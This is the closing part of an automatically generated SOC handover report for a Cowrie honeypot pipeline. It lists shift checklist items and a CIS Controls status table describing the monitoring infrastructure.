> **Report grouping:** 184 priority case(s) shown individually · 30 recon entry/entries in table (10 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-01T23:54:04Z_
